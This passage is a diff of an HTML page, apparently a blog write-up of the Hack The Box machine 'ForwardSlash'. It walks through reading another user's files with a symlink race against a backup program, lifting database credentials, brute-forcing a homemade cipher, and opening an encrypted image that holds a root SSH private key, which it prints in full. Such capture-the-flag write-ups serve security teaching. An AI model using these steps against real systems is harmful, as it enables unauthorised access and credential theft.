-remove(&quot;9c71365535e44dc76d65bbcd1faaab14&quot;...)                                                                                                    = -1
+remove("9c71365535e44dc76d65bbcd1faaab14"...)                                                                                                    = -1
 +++ exited (status 0) +++
 </code></pre></div>
-
 <p>With a simple combination of <code>grep</code> and <code>cut</code> we can extract the current filename
 used by the program:</p>
-<div class="highlight"><pre><span></span><code>chiv@forwardslash:~$ /usr/bin/backup | grep ERROR | cut -d &#39; &#39; -f 2
+<div class="highlight"><pre><span></span><code>chiv@forwardslash:~$ /usr/bin/backup | grep ERROR | cut -d ' ' -f 2
 705159512ab36c24a46aead527de7fb5
 </code></pre></div>
-
 <p>We can then create a temporary folder and try to get the file <code>user.txt</code> in
 pain's homedir by creating a symlink with the name of the file used by the backup
 program and then read it.</p>
-<div class="highlight"><pre><span></span><code>chiv@forwardslash:/tmp/lolo$ ln -s /home/pain/user.txt ./$(/usr/bin/backup | grep ERROR | cut -d &#39; &#39; -f 2)  &amp;&amp; /usr/bin/backup
+<div class="highlight"><pre><span></span><code>chiv@forwardslash:/tmp/lolo$ ln -s /home/pain/user.txt ./$(/usr/bin/backup | grep ERROR | cut -d ' ' -f 2)  &amp;&amp; /usr/bin/backup
 ----------------------------------------------------------------------
-        Pain&#39;s Next-Gen Time Based Backup Viewer
+        Pain's Next-Gen Time Based Backup Viewer
         v0.1
         NOTE: not reading the right file yet,
         only works if backup is taken in same second
@@ -507,12 +442,11 @@ program and then read it.</p>
 Current Time: 12:28:53
 aec49cafdb7eec8710d3bdf623ac28f7
 </code></pre></div>
-
 <p>We apply the same thing for the <code>config.php.bak</code> file in <code>/var/backup/</code> and get
 some database credentials.</p>
-<div class="highlight"><pre><span></span><code>chiv@forwardslash:/tmp/lolo$ ln -s /var/backups/config.php.bak ./$(/usr/bin/backup | grep ERROR | cut -d &#39; &#39; -f 2)  &amp;&amp; /usr/bin/backup
+<div class="highlight"><pre><span></span><code>chiv@forwardslash:/tmp/lolo$ ln -s /var/backups/config.php.bak ./$(/usr/bin/backup | grep ERROR | cut -d ' ' -f 2)  &amp;&amp; /usr/bin/backup
 ----------------------------------------------------------------------
-        Pain&#39;s Next-Gen Time Based Backup Viewer
+        Pain's Next-Gen Time Based Backup Viewer
         v0.1
         NOTE: not reading the right file yet,
         only works if backup is taken in same second
@@ -521,31 +455,29 @@ some database credentials.</p>
 Current Time: 12:28:11
 &lt;?php
 /* Database credentials. Assuming you are running MySQL
-server with default setting (user &#39;root&#39; with no password) */
-define(&#39;DB_SERVER&#39;, &#39;localhost&#39;);
-define(&#39;DB_USERNAME&#39;, &#39;pain&#39;);
-define(&#39;DB_PASSWORD&#39;, &#39;db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&#39;);
-define(&#39;DB_NAME&#39;, &#39;site&#39;);
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'pain');
+define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
+define('DB_NAME', 'site');
 
 /* Attempt to connect to MySQL database */
 $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
 // Check connection
 if($link === false){
-    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());
+    die("ERROR: Could not connect. " . mysqli_connect_error());
 }
 ?&gt;
 </code></pre></div>
-
 <p>This credentials allows us to connect as pain using SSH (we can grab the
 <code>user.txt</code> again).</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~/pown/htb_cache$ ssh pain@10.10.10.183
-pain@10.10.10.183&#39;s password:
+pain@10.10.10.183's password:
 &lt;snip&gt;
 pain@forwardslash:~$ cat user.txt
 96628de4960f22df8f7006205a8fa0bf
 </code></pre></div>
-
 <h2>Getting root</h2>
 <p>In <code>pain</code> homefolder we also found a <code>note.txt</code> which disclose that some
 "important" file are encrypted using homemade crypto (<strong>never use homemade
@@ -555,7 +487,6 @@ Pain, even though they got into our server, I made sure to encrypt any important
 
 -chiv
 </code></pre></div>
-
 <p>The folder <code>encryptorinator</code> contains a scripts in order to encrypt and
 decrypt a message and an encrypted message. The <code>encrypter</code> script is the
 following:</p>
@@ -572,7 +503,7 @@ following:</p>
             <span class="k">while</span> <span class="n">tmp</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">:</span>
                 <span class="n">tmp</span> <span class="o">-=</span> <span class="mi">256</span>
             <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
     <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
@@ -586,12 +517,11 @@ following:</p>
             <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
                 <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span>
             <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
 
-<span class="nb">print</span> <span class="n">encrypt</span><span class="p">(</span><span class="s1">&#39;REDACTED&#39;</span><span class="p">,</span> <span class="s1">&#39;REDACTED&#39;</span><span class="p">)</span>
-<span class="nb">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s1">&#39;REDACTED&#39;</span><span class="p">,</span> <span class="n">encrypt</span><span class="p">(</span><span class="s1">&#39;REDACTED&#39;</span><span class="p">,</span> <span class="s1">&#39;REDACTED&#39;</span><span class="p">))</span>
+<span class="nb">print</span> <span class="n">encrypt</span><span class="p">(</span><span class="s1">'REDACTED'</span><span class="p">,</span> <span class="s1">'REDACTED'</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s1">'REDACTED'</span><span class="p">,</span> <span class="n">encrypt</span><span class="p">(</span><span class="s1">'REDACTED'</span><span class="p">,</span> <span class="s1">'REDACTED'</span><span class="p">))</span>
 </code></pre></div>
-
 <p>The key can quickly be brute force with a quick script including the <code>decrypt</code>
 function and looking for some "classic" English words in the decrypted text.</p>
 <div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
@@ -606,29 +536,26 @@ function and looking for some "classic" English words in the decrypted text.</p>
             <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
                 <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span>
             <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
 
-<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ciphertext&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'ciphertext'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">165</span><span class="p">):</span>
   <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
     <span class="n">key</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">*</span> <span class="n">i</span>
     <span class="n">msg</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">)</span>
-    <span class="k">if</span> <span class="s1">&#39;the &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">&#39;be &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">&#39;and &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">&#39;of &#39;</span> <span class="ow">in</span> <span class="n">msg</span> <span class="p">:</span>
-      <span class="n">exit</span><span class="p">(</span><span class="s2">&quot;Key: </span><span class="si">{0}</span><span class="s2">, Key length: </span><span class="si">{1}</span><span class="s2">, Msg: </span><span class="si">{2}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">msg</span><span class="p">))</span>
+    <span class="k">if</span> <span class="s1">'the '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">'be '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">'and '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s1">'of '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="p">:</span>
+      <span class="n">exit</span><span class="p">(</span><span class="s2">"Key: </span><span class="si">{0}</span><span class="s2">, Key length: </span><span class="si">{1}</span><span class="s2">, Msg: </span><span class="si">{2}</span><span class="s2">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">msg</span><span class="p">))</span>
 </code></pre></div>
-
 <p>Running the script give the following result:</p>
 <div class="highlight"><pre><span></span><code>$ python2 decode.py
 Key: ttttttttttttttttt, Key length: 17, Msg: Hlô¿vFÞ;©¨ºÒÀî&amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
 </code></pre></div>
-
 <p><em>Note: there seems to be some flow in the encryption as every key starting with
 <code>t</code> and 17 characters long will decrypt the message. I modified the script to
 use a fixed key:</em></p>
 <div class="highlight"><pre><span></span><code>$ python2 decode.py
 Key: t2345678901234567, Key length: 17, Msg: HdD.ÛÄçáp޺¿éyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
 </code></pre></div>
-
 <p>We look at our <code>sudo</code> permission. We can run a few commands as root without
 password mostly <code>/sbin/cryptsetup luksOpen</code> that allow to open a LUKS encrypted
 image.</p>
@@ -641,7 +568,6 @@ User pain may run the following commands on forwardslash:
     (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
     (root) NOPASSWD: /bin/umount ./mnt/
 </code></pre></div>
-
 <p>With the passphrase and our <code>sudo</code> permission we can easily open the
 <code>encrypted_backup.img</code> image which contain a RSA private key.</p>
 <div class="highlight"><pre><span></span><code>pain@forwardslash:/tmp/plop$ mkdir mnt
@@ -679,7 +605,6 @@ ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
 ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
 -----END RSA PRIVATE KEY-----
 </code></pre></div>
-
 <p>With the private key we can directly connect as <code>root</code> to the local machine and get
 the <code>root.txt</code> flag:</p>
 <div class="highlight"><pre><span></span><code>pain@forwardslash:/tmp/plop$ ssh root@localhost -i mnt/id_rsa
@@ -687,67 +612,45 @@ the <code>root.txt</code> flag:</p>
 root@forwardslash:~# cat root.txt
 419f9c340fcc83acccfcbebfe17d2538
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>This box was hard. I don't usually do the hard box as they take so much time.
 This one was long and I ask a few questions on the discord channel to avoid
 taking too much time on rabbit hole. Nevertheless the box feels good.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/openadmin.html">openAdmin</a>
-      <a href="../../tag/linux.html">Linux</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/06/htb-servmon.html" title="HTB: ServMon">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/07/htb-book.html" title="HTB: Book">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/openadmin.html">openAdmin</a>
+<a href="../../tag/linux.html">Linux</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/06/htb-servmon.html" title="HTB: ServMon">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/07/htb-book.html" title="HTB: Book">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -758,6 +661,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
